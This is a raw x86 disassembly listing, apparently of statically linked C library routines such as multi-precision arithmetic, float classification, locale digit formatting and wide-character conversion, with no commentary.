mov esi, dword [var_2ch]
mov ebx, dword [arg_8h]
mov dword [ebx + edi*4], esi
mov edi, dword [var_28h]
sub edi, eax
sbb ecx, edx
mov eax, edi
mov edx, ecx
dec dword [var_14h]
jns 0x808c5a3
mov ecx, dword [arg_10h]
mov dword [ecx + 4], edx
mov dword [ecx], eax
jmp 0x808c50a
lea ecx, [edx + eax]
mov dword [var_2ch], 0xffffffff
cmp ecx, edx
jae 0x808c642
sub ecx, dword [var_30h]
mov edi, dword [arg_10h]
mov ebx, dword [arg_8h]
mov eax, dword [edi]
mov edx, ecx
mov ecx, dword [var_14h]
add eax, dword [var_30h]
adc edx, 0
mov dword [ebx + ecx*4], 0xffffffff
jmp 0x808c603
mov edx, dword [var_30h]
lea eax, [edx - 1]
test edx, edx
cmovne edx, eax
mov eax, dword [var_30h]
neg eax
jmp 0x808c5c3
mov esi, dword [arg_10h]
mov dword [esi], 0
jmp 0x808c5b3
mov eax, dword [arg_1ch]
test eax, eax
jne 0x808c3ad
mov eax, 1
cdq
idiv dword [var_10h]
jmp 0x808c50d
mov eax, dword [arg_18h]
mov edx, dword [arg_10h]
mov ebx, dword [eax]
mov ecx, dword [edx + esi*4 - 4]
cmp ecx, ebx
jb 0x808c697
sub ecx, ebx
mov dword [var_10h], 1
mov eax, dword [arg_8h]
mov edi, dword [arg_ch]
lea eax, [eax + edi*4]
mov edi, esi
sub edi, 2
mov dword [arg_8h], eax
js 0x808c6bf
mov edx, dword [arg_10h]
mov esi, dword [arg_8h]
mov eax, dword [edx + edi*4]
mov edx, ecx
div ebx
mov dword [esi + edi*4], eax
mov ecx, edx
dec edi
jns 0x808c6aa
mov eax, dword [arg_ch]
mov edi, dword [arg_ch]
shl eax, 2
sub dword [arg_8h], eax
dec edi
js 0x808c6e1
xor esi, esi
mov edx, ecx
mov eax, esi
div ebx
mov ecx, edx
mov edx, dword [arg_8h]
mov dword [edx + edi*4], eax
dec edi
jns 0x808c6d0
mov ebx, dword [arg_10h]
mov dword [ebx], ecx
jmp 0x808c50a
push ebp
mov ebp, esp
sub esp, 0x18
mov eax, dword [arg_8h]
mov edx, dword [arg_ch]
mov ecx, dword [arg_10h]
mov dword [var_18h], eax
mov dword [var_14h], edx
mov eax, dword [var_14h]
mov dword [var_10h], ecx
movsx edx, word [var_10h]
and eax, 0x7fffffff
or eax, dword [var_18h]
leave
and edx, 0x7fff
add edx, edx
mov ecx, eax
neg ecx
or eax, ecx
shr eax, 0x1f
or edx, eax
mov eax, 0xfffe
sub eax, edx
sar eax, 0x10
ret
push ebp
mov ebp, esp
push esi
mov ecx, dword [arg_ch]
push ebx
mov ebx, dword [arg_8h]
movzx edx, byte [ecx]
cmp dl, 0x7f
je 0x8069fe4
test dl, dl
jle 0x8069fe4
movsx eax, dl
xor esi, esi
cmp ebx, eax
jbe 0x8069fcd
movsx eax, dl
inc ecx
inc esi
sub ebx, eax
movzx eax, byte [ecx]
cmp al, 0x7f
mov edx, eax
je 0x8069fcd
test al, al
jl 0x8069fcd
je 0x8069fd3
movsx eax, al
cmp ebx, eax
ja 0x8069fb0
mov eax, esi
pop ebx
pop esi
leave
ret
movsx edx, byte [ecx - 1]
lea eax, [ebx - 1]
mov ecx, edx
xor edx, edx
div ecx
add esi, eax
jmp 0x8069fcd
xor eax, eax
jmp 0x8069fcf
push ebp
mov ebp, esp
push esi
push ebx
mov ebx, ecx
sub esp, 0x1c
mov dword [var_ch], ecx
mov eax, dword [ecx - 0x20]
test eax, eax
je 0x8067e2e
cmp dword [ecx - 0x30], 0x66
je 0x8067f40
mov eax, dword [ebx - 0x28]
test eax, eax
je 0x8067f00
cmp dword [ebx - 0x18], eax
jge 0x8067e80
xor esi, esi
mov dword [var_sp_ch], 0xa
mov eax, dword [ebx - 0x18]
mov dword [var_8h], eax
mov eax, dword [ebx - 0x14]
mov dword [var_4h], eax
mov eax, dword [ebx - 0x14]
mov dword [esp], eax
call fcn.0808cae0
test eax, eax
mov ecx, eax
je 0x8067e73
mov edx, dword [ebx - 0x18]
mov eax, dword [ebx - 0x14]
mov dword [eax + edx*4], ecx
inc dword [ebx - 0x18]
add esp, 0x1c
lea eax, [esi + 0x30]
pop ebx
pop esi
leave
ret
lea esi, [esi]
mov dword [var_14h], eax
mov eax, dword [ebx - 0x24]
mov dword [var_10h], eax
mov eax, dword [ebx - 0x18]
mov dword [var_sp_ch], eax
mov eax, dword [ebx - 0x14]
mov dword [var_4h], 0
mov dword [var_8h], eax
mov eax, dword [ebx - 0x2c]
mov dword [esp], eax
call fcn.0808c380
mov edx, dword [ebx - 0x2c]
mov esi, eax
mov eax, dword [ebx - 0x18]
sub eax, dword [ebx - 0x28]
mov dword [edx + eax*4], esi
mov eax, dword [ebx - 0x28]
mov esi, dword [edx]
test eax, eax
mov dword [ebx - 0x18], eax
je 0x8067eef
mov edx, dword [ebx - 0x14]
mov eax, dword [edx + eax*4 - 4]
test eax, eax
jne 0x8067ee4
mov eax, dword [ebx - 0x18]
dec eax
test eax, eax
mov dword [ebx - 0x18], eax
je 0x8067eef
mov eax, dword [edx + eax*4 - 4]
test eax, eax
je 0x8067ed1
mov ecx, dword [ebx - 0x18]
test ecx, ecx
jne 0x8067e40
mov dword [ebx - 0x18], 1
jmp 0x8067e73
nop
lea esi, [esi]
mov edx, dword [ebx - 0x18]
mov eax, dword [ebx - 0x14]
mov esi, dword [eax + edx*4 - 4]
mov dword [var_sp_ch], 0xa
mov eax, dword [ebx - 0x18]
dec eax
mov dword [var_8h], eax
mov eax, dword [ebx - 0x14]
mov dword [var_4h], eax
mov eax, dword [ebx - 0x14]
mov dword [esp], eax
call fcn.0808cae0
mov edx, dword [ebx - 0x14]
mov ecx, dword [ebx - 0x18]
mov dword [edx + ecx*4 - 4], eax
jmp 0x8067e73
nop
lea esi, [esi]
mov edx, dword [ecx - 0x1c]
xor esi, esi
lea eax, [edx - 1]
test edx, edx
mov dword [ecx - 0x1c], eax
jg 0x8067e73
jmp 0x8067e2e
push ebp
mov ebp, esp
push edi
mov edi, eax
push esi
mov eax, edx
mov esi, ecx
push ebx
sub esp, 0x10
mov ecx, dword [arg_10h]
mov dword [var_10h], edx
test ecx, ecx
jne 0x806a013
add esp, 0x10
pop ebx
pop esi
pop edi
leave
ret 0xc
lea eax, [edi + esi*4]
sub edx, eax
mov dword [var_4h], eax
mov eax, dword [arg_10h]
sar edx, 2
mov dword [var_8h], edx
lea ebx, [eax + esi]
lea ebx, [edi + ebx*4]
mov dword [esp], ebx
call fcn.08077700
mov eax, dword [arg_8h]
lea ecx, [ebx - 4]
movzx edx, byte [eax]
lea esi, [esi]
movsx edx, dl
inc dword [arg_8h]
dec esi
mov eax, dword [edi + esi*4]
mov dword [ecx], eax
sub ecx, 4
dec edx
jne 0x806a046
mov edx, dword [arg_ch]
mov eax, dword [arg_8h]
mov dword [ecx], edx
movzx edx, byte [eax]
sub ecx, 4
cmp dl, 0x7f
je 0x806a080
test dl, dl
jl 0x806a080
jne 0x806a072
dec eax
mov dword [arg_8h], eax
movzx edx, byte [eax]
movsx eax, dl
cmp esi, eax
ja 0x806a040
lea esi, [esi]
dec esi
mov eax, dword [edi + esi*4]
mov dword [ecx], eax
sub ecx, 4
cmp ecx, edi
ja 0x806a080
mov edx, dword [arg_10h]
mov ecx, dword [var_10h]
lea eax, [ecx + edx*4]
jmp 0x806a009
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x44
mov edi, dword [arg_8h]
mov dword [esp], 0x80a09c4
call fcn.0807ac80
mov dword [esp], 0x2e
mov dword [var_38h], eax
mov dword [var_4h], eax
call fcn.0807ad50
mov esi, eax
mov dword [esp], 0x2c
mov eax, dword [var_38h]
mov dword [var_4h], eax
call fcn.0807ad50
mov edx, dword [var_38h]
mov dword [var_3ch], eax
test edx, edx
jne 0x8067d76
mov edx, dword [arg_ch]
sub edx, edi
lea eax, [edx + 0x12]
and eax, 0xfffffffc
sub esp, eax
lea eax, [var_1fh]
mov dword [var_4h], edi
mov dword [var_8h], edx
and eax, 0xfffffff0
mov dword [var_40h], eax
mov dword [esp], eax
call fcn.08053740
mov esi, eax
mov edi, dword [arg_ch]
dec esi
cmp esi, dword [var_40h]
jb 0x8067d26
movzx edx, byte [esi]
lea eax, [edx - 0x30]
cmp al, 9
ja 0x8067d37
movsx eax, dl
lea ebx, [eax - 0x30]
cmp ebx, 9
ja 0x8067de1
mov eax, 0
test eax, eax
je 0x8067d30
mov dword [esp], 3
call section.
mov eax, dword [eax]
lea edx, [ebx + 0x29]
and edx, 0xffff
mov ebx, dword [eax + edx*4 + 0x24]
mov dword [esp], ebx
call fcn.08053400
mov ecx, edi
mov edx, eax
sub ecx, eax
dec edx
test eax, eax
je 0x8067d1e
movzx eax, byte [edx + ebx]
mov byte [edx + ecx], al
mov eax, edx
dec edx
test eax, eax
jne 0x8067d10
mov edi, ecx
dec esi
cmp esi, dword [var_40h]
jae 0x8067cc0
lea esp, [var_ch]
mov eax, edi
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [0x80a9ab4]
jmp 0x8067cee
mov eax, dword [var_38h]
test eax, eax
jne 0x8067d43
dec edi
mov byte [edi], dl
jmp 0x8067d20
cmp dl, 0x2e
je 0x8067d71
cmp dl, 0x2c
jne 0x8067d3e
lea ebx, [var_2ch]
mov dword [esp], ebx
call fcn.08053400
mov edx, eax
sub edi, eax
dec edx
test eax, eax
je 0x8067d20
movzx eax, byte [edx + ebx]
mov byte [edx + edi], al
mov eax, edx
dec edx
test eax, eax
jne 0x8067d61
jmp 0x8067d20
lea ebx, [var_1ch]
jmp 0x8067d50
lea ebx, [var_34h]
lea eax, [var_1ch]
mov dword [var_34h], 0
mov dword [var_30h], 0
mov dword [var_8h], ebx
mov dword [var_4h], esi
mov dword [esp], eax
call fcn.08077b00
mov dword [var_8h], ebx
inc eax
mov edx, 0x2e
mov dword [var_34h], 0
cmovne dx, word [var_1ch]
mov eax, dword [var_3ch]
mov dword [var_30h], 0
mov dword [var_4h], eax
lea eax, [var_2ch]
mov word [var_1ch], dx
mov dword [esp], eax
call fcn.08077b00
inc eax
mov edx, 0x2c
cmovne dx, word [var_2ch]
mov word [var_2ch], dx
jmp 0x8067c8e
mov dword [var_sp_ch], str.outdigit_value
mov dword [var_8h], 0x24
mov dword [var_4h], str..._locale_outdigits.h
mov dword [esp], str.0___n__n___9
call fcn.0805efc0
lea esi, [esi]
lea edi, [edi]
push edi
push esi
push ebx
mov edi, dword [arg_10h]
mov esi, dword [arg_14h]
mov edx, dword [arg_18h]
mov ecx, dword [arg_1ch]
lea edi, [edi + edx*4 - 4]
lea esi, [esi + edx*4]
neg edx
mov ebx, dword [esi + edx*4]
xor eax, eax
shrd eax, ebx, cl
inc edx
je 0x808c79f
push eax
test dl, 1
jne 0x808c78a
mov eax, ebx
nop
mov ebx, dword [esi + edx*4]
shrd eax, ebx, cl
mov dword [edi + edx*4], eax
inc edx
mov eax, dword [esi + edx*4]
shrd ebx, eax, cl
mov dword [edi + edx*4], ebx
inc edx
jne 0x808c780
shr eax, cl
mov dword [edi], eax
pop eax
pop ebx
pop esi
pop edi
ret
shr ebx, cl
mov dword [edi], ebx
pop ebx
pop esi
pop edi
ret
push edi
push esi
push ebx
mov edi, dword [arg_10h]
mov esi, dword [arg_14h]
mov edx, dword [arg_18h]
mov ecx, dword [arg_1ch]
sub esi, 4
mov ebx, dword [esi + edx*4]
xor eax, eax
shld eax, ebx, cl
dec edx
je 0x808c73f
push eax
test dl, 1
jne 0x808c72a
mov eax, ebx
lea esi, [esi]
mov ebx, dword [esi + edx*4]
shld eax, ebx, cl
mov dword [edi + edx*4], eax
dec edx
mov eax, dword [esi + edx*4]
shld ebx, eax, cl
mov dword [edi + edx*4], ebx
dec edx
jne 0x808c720
shl eax, cl
mov dword [edi], eax
pop eax
pop ebx
pop esi
pop edi
ret
shl ebx, cl
mov dword [edi], ebx
pop ebx
pop esi
pop edi
ret
push ebp
mov ebp, esp
push ebx
mov edx, dword [arg_10h]
mov ecx, dword [arg_ch]
mov ebx, dword [arg_8h]
dec edx
js 0x808c34b
mov eax, dword [ecx + edx*4]
cmp dword [ebx + edx*4], eax
jne 0x808c350
dec edx
jns 0x808c340
xor eax, eax
pop ebx
leave
ret
seta al
movzx eax, al
lea eax, [eax + eax - 1]
jmp 0x808c34d
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x28
mov eax, dword [arg_10h]
mov edi, dword [arg_8h]
add eax, dword [arg_18h]
cmp dword [arg_18h], 0x1f
lea eax, [edi + eax*4 - 4]
mov dword [var_10h], eax
jg 0x808c8d3
mov edx, dword [arg_18h]
xor eax, eax
test edx, edx
je 0x808c851
mov edx, dword [arg_14h]
mov eax, dword [edx]
cmp eax, 1
ja 0x808c8b4
je 0x808c891
xor eax, eax
cmp eax, dword [arg_10h]
jge 0x808c814
mov dword [edi + eax*4], 0
inc eax
cmp eax, dword [arg_10h]
jl 0x808c807
xor eax, eax
mov ecx, dword [arg_10h]
mov ebx, 1
mov dword [edi + ecx*4], eax
add edi, 4
cmp ebx, dword [arg_18h]
jge 0x808c851
lea esi, [esi]
mov edx, dword [arg_14h]
mov eax, dword [edx + ebx*4]
cmp eax, 1
ja 0x808c875
mov eax, 0
je 0x808c859
mov edx, dword [arg_10h]
inc ebx
mov dword [edi + edx*4], eax
add edi, 4
cmp ebx, dword [arg_18h]
jl 0x808c830
lea esp, [var_bp_ch]
pop ebx
pop esi
pop edi
leave
ret
mov ecx, dword [arg_10h]
mov eax, dword [arg_ch]
mov dword [var_4h], edi
mov dword [esp], edi
mov dword [var_ch], ecx
mov dword [var_8h], eax
call fcn.0808c2a0
jmp 0x808c842
mov edx, dword [arg_10h]
mov ecx, dword [arg_ch]
mov dword [var_ch], eax
mov dword [esp], edi
mov dword [var_8h], edx
mov dword [var_4h], ecx
call fcn.08090d80
jmp 0x808c842
xor edx, edx
cmp edx, dword [arg_10h]
jge 0x808c814
lea esi, [esi]
mov ecx, dword [arg_ch]
mov eax, dword [ecx + edx*4]
mov dword [edi + edx*4], eax
inc edx
cmp edx, dword [arg_10h]
jl 0x808c8a0
jmp 0x808c814
mov dword [var_ch], eax
mov edx, dword [arg_ch]
mov dword [esp], edi
mov eax, dword [arg_10h]
mov dword [var_4h], edx
mov dword [var_8h], eax
call fcn.0808cae0
jmp 0x808c816
mov ecx, dword [arg_18h]
mov edx, dword [arg_14h]
lea ebx, [ecx*8 + 0x10]
sub esp, ebx
mov dword [var_ch], ecx
lea eax, [var_23h]
mov dword [var_8h], edx
mov ecx, dword [arg_ch]
and eax, 0xfffffff0
mov dword [esp], edi
mov dword [var_18h], eax
mov dword [var_sp_10h], eax
mov dword [var_4h], ecx
call fcn.0808cc10
mov eax, dword [arg_18h]
mov edx, dword [arg_18h]
sub dword [arg_10h], edx
shl eax, 2
add dword [arg_ch], eax
add edi, eax
cmp dword [arg_10h], edx
jl 0x808c9d8
sub esp, ebx
mov dword [var_20h], eax
lea ecx, [var_23h]
and ecx, 0xfffffff0
mov dword [var_1ch], ecx
cmp dword [arg_18h], 0x1f
jg 0x808cab3
mov eax, dword [arg_18h]
mov edx, dword [arg_14h]
mov ecx, dword [arg_ch]
mov dword [var_ch], eax
mov dword [var_8h], edx
mov eax, dword [var_1ch]
mov dword [var_4h], ecx
mov dword [esp], eax
call fcn.0808cb40
mov edx, dword [var_1ch]
mov eax, dword [arg_18h]
mov dword [var_4h], edi
mov dword [esp], edi
mov dword [var_8h], edx
mov dword [var_ch], eax
call fcn.0808c2a0
mov ecx, dword [var_20h]
mov dword [var_14h], eax
mov esi, dword [arg_18h]
lea ebx, [ecx + edi]
mov ecx, dword [var_1ch]
add ecx, dword [var_20h]
mov eax, dword [ecx]
add ecx, 4
mov edx, eax
mov eax, dword [var_14h]
add eax, edx
mov dword [ebx], eax
add ebx, 4
cmp eax, edx
jae 0x808ca90
mov esi, dword [arg_18h]
dec esi
je 0x808c9c0
mov edx, dword [ecx]
add ecx, 4
inc edx
mov dword [ebx], edx
add ebx, 4
test edx, edx
jne 0x808ca90
dec esi
jne 0x808c9a5
nop
lea esi, [esi]
mov edx, dword [arg_18h]
add edi, dword [var_20h]
sub dword [arg_10h], edx
mov eax, dword [var_20h]
add dword [arg_ch], eax
cmp dword [arg_10h], edx
jge 0x808c930
mov eax, dword [arg_10h]
test eax, eax
jne 0x808c9e9
mov edx, dword [var_10h]
mov eax, dword [edx]
jmp 0x808c851
mov ecx, dword [arg_10h]
mov eax, dword [arg_ch]
mov edx, dword [arg_18h]
mov dword [var_sp_10h], ecx
mov dword [var_ch], eax
mov ecx, dword [arg_14h]
mov eax, dword [var_18h]
mov dword [var_8h], edx
mov dword [var_4h], ecx
mov dword [esp], eax
call fcn.0808c7c0
mov dword [esp], edi
mov edx, dword [arg_18h]
mov ecx, dword [var_18h]
mov dword [var_4h], edi
mov dword [var_ch], edx
mov dword [var_8h], ecx
call fcn.0808c2a0
mov dword [var_14h], eax
mov ecx, dword [var_18h]
mov esi, dword [arg_10h]
mov eax, dword [arg_18h]
shl eax, 2
add ecx, eax
lea ebx, [eax + edi]
mov eax, dword [ecx]
add ecx, 4
mov edx, eax
mov eax, dword [var_14h]
add eax, edx
mov dword [ebx], eax
add ebx, 4
cmp eax, edx
jae 0x808ca6d
dec esi
je 0x808c9df
mov edx, dword [ecx]
add ecx, 4
inc edx
mov dword [ebx], edx
add ebx, 4
test edx, edx
jne 0x808ca6d
dec esi
jne 0x808ca56
jmp 0x808c9df
cmp ebx, ecx
je 0x808c9df
xor edx, edx
dec esi
cmp edx, esi
jge 0x808c9df
mov eax, dword [ecx + edx*4]
mov dword [ebx + edx*4], eax
inc edx
cmp edx, esi
jl 0x808ca80
jmp 0x808c9df
cmp ebx, ecx
je 0x808c9c0
xor edx, edx
dec esi
cmp edx, esi
jge 0x808c9c0
mov eax, dword [ecx + edx*4]
mov dword [ebx + edx*4], eax
inc edx
cmp edx, esi
jl 0x808caa3
jmp 0x808c9c0
mov edx, dword [var_18h]
mov ecx, dword [arg_18h]
mov eax, dword [arg_14h]
mov dword [var_sp_10h], edx
mov dword [var_ch], ecx
mov edx, dword [arg_ch]
mov ecx, dword [var_1ch]
mov dword [var_8h], eax
mov dword [var_4h], edx
mov dword [esp], ecx
call fcn.0808cc10
jmp 0x808c95a
push ebp
mov ebp, esp
sub esp, 0x18
mov ecx, dword [arg_10h]
mov eax, dword [arg_8h]
mov edx, dword [arg_ch]
mov dword [var_10h], ecx
mov dword [var_18h], eax
movsx ecx, word [var_10h]
mov dword [var_14h], edx
mov eax, dword [var_14h]
mov edx, ecx
xor eax, 0x80000000
and ecx, 0x8000
and edx, 0x7fff
sar ecx, 0xe
xor edx, 0x7fff
or eax, edx
or eax, dword [var_18h]
leave
mov edx, eax
neg edx
or eax, edx
mov edx, 1
sar eax, 0x1f
sub edx, ecx
not eax
and eax, edx
ret
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x10
mov ecx, dword [arg_20h]
mov edx, dword [arg_1ch]
mov eax, dword [arg_18h]
mov esi, dword [arg_8h]
mov dword [var_14h], ecx
mov dword [var_18h], edx
mov ecx, dword [arg_10h]
mov dword [var_1ch], eax
mov edx, dword [arg_14h]
movzx eax, byte [var_13h]
shr al, 7
movzx eax, al
mov dword [edx], eax
movzx edx, word [var_14h]
and edx, 0x7fff
lea eax, [edx - 0x3fff]
test edx, edx
mov dword [ecx], eax
mov eax, dword [var_1ch]
mov dword [esi], eax
mov ecx, dword [var_18h]
mov dword [esi + 4], ecx
jne 0x808d7a2
test eax, eax
jne 0x808d7af
test ecx, ecx
jne 0x808d7af
mov eax, dword [arg_10h]
mov dword [eax], 0
add esp, 0x10
mov eax, 2
pop ebx
pop esi
pop edi
leave
ret
mov ebx, dword [esi + 4]
and ebx, 0x7fffffff
test ebx, ebx
mov dword [esi + 4], ebx
je 0x808d7f3
bsr eax, ebx
mov edi, eax
xor edi, 0x1f
je 0x808d7e5
mov edx, dword [esi]
mov ecx, edi
shl ebx, cl
mov ecx, 0x20
sub ecx, edi
mov eax, edx
shr eax, cl
mov ecx, edi
or ebx, eax
shl edx, cl
mov dword [esi + 4], ebx
mov dword [esi], edx
mov eax, 0xffffc002
mov edx, dword [arg_10h]
sub eax, edi
mov dword [edx], eax
jmp 0x808d7a2
mov eax, dword [esi]
test eax, eax
je 0x808d813
bsr edi, eax
mov dword [esi], 0
xor edi, 0x1f
mov ecx, edi
shl eax, cl
mov dword [esi + 4], eax
mov eax, 0xffffbfe2
jmp 0x808d7ea
mov ecx, dword [arg_10h]
mov dword [esi + 4], 0x80000000
mov dword [ecx], 0xffffc002
jmp 0x808d7a2
push ebp
mov ebp, esp
mov eax, dword [arg_8h]
mov edx, dword [arg_ch]
leave
mov ecx, edx
mov edx, eax
neg edx
and ecx, 0x7fffffff
or eax, edx
shr eax, 0x1f
or ecx, eax
mov eax, 0x7ff00000
sub eax, ecx
shr eax, 0x1f
ret
push ebp
mov ebp, esp
mov edx, dword [arg_ch]
mov eax, dword [arg_8h]
leave
mov ecx, edx
and edx, 0x7fffffff
xor edx, 0x7ff00000
sar ecx, 0x1e
or eax, edx
mov edx, eax
neg edx
or eax, edx
sar eax, 0x1f
not eax
and eax, ecx
ret
push ebp
mov ebp, esp
push edi
push esi
mov eax, dword [arg_14h]
mov ecx, dword [arg_18h]
push ebx
mov esi, dword [arg_10h]
mov edi, dword [arg_8h]
mov ebx, dword [arg_1ch]
mov dword [edi], ecx
mov edx, ebx
shr edx, 0x1f
mov dword [eax], edx
mov edx, ebx
shr edx, 0x14
and edx, 0x7ff
lea eax, [edx - 0x3ff]
mov dword [esi], eax
mov esi, ebx
and esi, 0xfffff
test edx, edx
mov dword [edi + 4], esi
jne 0x808d71b
test ecx, ecx
jne 0x808d69f
test esi, esi
jne 0x808d69f
mov eax, dword [arg_10h]
mov dword [eax], 0
pop ebx
pop esi
pop edi
mov eax, 2
leave
ret
mov esi, dword [edi + 4]
test esi, esi
je 0x808d6d9
bsr ebx, esi
mov edx, dword [edi]
xor ebx, 0x1f
sub ebx, 0xb
mov ecx, ebx
shl esi, cl
mov eax, edx
mov ecx, 0x20
sub ecx, ebx
shr eax, cl
mov ecx, ebx
or esi, eax
shl edx, cl
mov eax, 0xfffffc02
mov dword [edi + 4], esi
sub eax, ebx
mov dword [edi], edx
mov esi, dword [arg_10h]
mov dword [esi], eax
jmp 0x808d695
bsr ebx, dword [edi]
xor ebx, 0x1f
cmp ebx, 0xa
jle 0x808d702
mov eax, dword [edi]
lea ecx, [ebx - 0xb]
mov dword [edi], 0
shl eax, cl
mov dword [edi + 4], eax
mov edx, dword [arg_10h]
mov eax, 0xfffffbed
sub eax, ebx
mov dword [edx], eax
jmp 0x808d695
mov edx, dword [edi]
mov ecx, 0xb
sub ecx, ebx
mov eax, edx
shr eax, cl
lea ecx, [ebx + 0x15]
shl edx, cl
mov dword [edi + 4], eax
mov dword [edi], edx
jmp 0x808d6f4
or esi, 0x100000
mov dword [edi + 4], esi
jmp 0x808d695
push ebp
mov ebp, esp
shl dword [arg_10h], 2
leave
jmp fcn.08053690
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0xb4
mov dword [esp], 0x64
call fcn.08050fe0
mov esi, eax
mov eax, 0xffffffff
test esi, esi
je 0x8076b9e
lea ebx, [var_ach]
mov dword [var_64h], 0
mov dword [var_10h], 0
mov dword [var_ch], 0
mov dword [var_8h], 0xffffffff
mov dword [var_4h], 0x8000
mov dword [esp], ebx
call fcn.0804e030
mov dword [var_18h], 0x8092c20
mov dword [var_ch], esi
mov dword [var_8h], 0x64
mov dword [var_4h], esi
mov dword [esp], ebx
call fcn.0804e940
mov eax, dword [arg_10h]
and dword [var_ach], 0xfffffffe
mov dword [var_14h], fcn.08050fe0
mov dword [var_bp_10h], fcn.08051180
mov dword [esp], ebx
mov dword [var_8h], eax
mov eax, dword [arg_ch]
mov dword [var_4h], eax
call fcn.08064160
test eax, eax
mov edi, eax
js 0x8076bc2
mov edx, dword [var_9ch]
mov ebx, dword [var_98h]
mov eax, dword [var_94h]
sub ebx, edx
sub eax, edx
lea esi, [ebx + 1]
add eax, eax
cmp eax, esi
jbe 0x8076ba9
mov dword [esp], esi
call fcn.08050fe0
mov edx, eax
mov eax, dword [arg_8h]
test edx, edx
mov dword [eax], edx
je 0x8076ba9
mov eax, dword [var_90h]
mov dword [var_8h], ebx
mov dword [esp], edx
mov dword [var_4h], eax
call fcn.08053770
mov eax, dword [var_90h]
mov dword [esp], eax
call fcn.08051180
mov edx, dword [arg_8h]
mov eax, dword [edx]
test eax, eax
jne 0x8076b97
mov eax, dword [var_90h]
mov dword [edx], eax
mov byte [esi + eax - 1], 0
mov eax, edi
add esp, 0xb4
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [var_90h]
mov dword [var_4h], esi
mov dword [esp], eax
call fcn.08051220
mov edx, dword [arg_8h]
mov dword [edx], eax
jmp 0x8076b86
mov eax, dword [var_90h]
mov dword [esp], eax
call fcn.08051180
jmp 0x8076b9c
push ebp
mov ebp, esp
push ebx
mov ebx, dword [arg_8h]
mov eax, dword [ebx]
mov ecx, dword [eax]
lea edx, [eax + 4]
mov eax, dword [eax + 4]
mov dword [ebx], edx
sub eax, 0x30
sub ecx, 0x30
cmp eax, 9
ja 0x806b9bb
mov esi, esi
mov edx, dword [ebx]
lea ecx, [ecx + ecx*4]
mov eax, dword [edx]
lea ecx, [eax + ecx*2 - 0x30]
lea eax, [edx + 4]
mov dword [ebx], eax
mov eax, dword [edx + 4]
sub eax, 0x30
cmp eax, 9
jbe 0x806b9a0
pop ebx
mov eax, ecx
leave
ret
push ebp
mov ebp, esp
sub esp, 0xc
mov dword [var_4h], ebx
mov edx, dword [arg_ch]
mov ebx, dword [arg_8h]
mov eax, dword [ebx + 4]
cmp eax, dword [ebx + 0xc]
jbe 0x804e1ac
cmp byte [eax - 1], dl
je 0x804e1c9
mov eax, dword [ebx + 0x94]
mov dword [esp], ebx
mov dword [var_sp_4h], edx
call dword [eax + 0x18]
cmp eax, 0xffffffff
je 0x804e1c4
and dword [ebx], 0xffffffef
mov ebx, dword [var_4h]
leave
ret
dec eax
mov dword [ebx + 4], eax
movzx eax, dl
jmp 0x804e1bc
push ebp
mov ebp, esp
sub esp, 0xc
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
mov eax, dword [ebx + 0x5c]
test eax, eax
jne 0x804daaf
mov dword [ebx + 0x5c], 0xffffffff
mov eax, 0xffffffff
inc eax
mov edx, 0xffffffff
jne 0x804dae9
test byte [ebx + 1], 8
jne 0x804db2d
mov eax, dword [ebx + 4]
mov edx, dword [ebx + 8]
cmp eax, edx
jb 0x804db24
test byte [ebx + 1], 1
jne 0x804db12
mov eax, dword [ebx + 0x30]
test eax, eax
jne 0x804db00
mov eax, dword [ebx + 0x24]
test eax, eax
jne 0x804daf0
mov eax, dword [ebx + 0x94]
mov dword [esp], ebx
call dword [eax + 0x14]
mov edx, eax
mov ebx, dword [var_4h]
mov eax, edx
leave
ret
mov dword [esp], ebx
call fcn.0804d7f0
jmp 0x804dadb
lea esi, [esi]
mov eax, ebx
call fcn.0804d870
mov edx, 0xffffffff
test eax, eax
je 0x804dadb
jmp 0x804dae9
mov dword [esp], ebx
call fcn.0804d710
mov eax, dword [ebx + 4]
mov edx, dword [ebx + 8]
cmp eax, edx
jae 0x804dacd
movzx edx, byte [eax]
inc eax
mov dword [ebx + 4], eax
jmp 0x804dae9
mov dword [esp], ebx
call fcn.0804d770
mov edx, 0xffffffff
inc eax
jne 0x804dabd
jmp 0x804dae9
push ebp
mov ebp, esp
push edi
push esi
lea ecx, [var_40h]
push ebx
sub esp, 0x60
mov dword [var_1ch], 0
mov dword [var_34h], 1
mov eax, dword [arg_8h]
mov edx, dword [arg_14h]
mov dword [var_30h], 0
mov edi, dword [arg_ch]
mov dword [var_2ch], 1
test eax, eax
cmove eax, ecx
test edx, edx
mov dword [var_4ch], eax
mov eax, 0x80aa9ac
cmovne eax, edx
test edi, edi
mov dword [var_28h], eax
je 0x8077ab8
mov eax, dword [var_4ch]
mov dword [var_3ch], eax
add eax, 4
mov dword [var_38h], eax
mov eax, 0
test eax, eax
je 0x8077aae
mov dword [esp], 3
call section.
mov ebx, dword [eax]
mov eax, dword [ebx + 0x14]
test eax, eax
je 0x8077a8e
mov esi, eax
mov edx, dword [arg_10h]
mov eax, 0xffffffff
mov dword [var_48h], edi
lea ebx, [edx + edi]
cmp ebx, edi
cmovb ebx, eax
mov eax, dword [esi]
mov eax, dword [eax + 0x14]
mov dword [esp], eax
call fcn.08083520
lea eax, [var_44h]
mov edx, dword [esi]
mov dword [var_ch], ebx
mov dword [var_14h], eax
mov dword [var_sp_1ch], 1
mov dword [var_18h], 0
lea eax, [var_48h]
mov dword [var_10h], 0
mov dword [var_8h], eax
lea eax, [var_3ch]
mov dword [var_4h], eax
mov eax, dword [esi]
mov dword [esp], eax
call dword [edx + 0x14]
test eax, eax
jne 0x8077a2f
mov eax, dword [var_4ch]
cmp dword [var_3ch], eax
je 0x8077a28
mov edx, dword [eax]
test edx, edx
jne 0x8077a28
mov eax, dword [var_28h]
mov eax, dword [eax]
test eax, eax
jne 0x8077a04
xor ebx, ebx
add esp, 0x60
mov eax, ebx
pop ebx
pop esi
pop edi
leave
ret
mov dword [var_ch], str.__mbrtowc
mov dword [var_8h], 0x60
mov dword [var_4h], str.mbrtowc.c
mov dword [esp], str.__data.__statep_____count__0_
call fcn.0805efc0
mov ebx, dword [var_48h]
sub ebx, edi
jmp 0x80779fa
cmp eax, 4
jne 0x8077a5e
test eax, eax
je 0x80779e1
cmp eax, 4
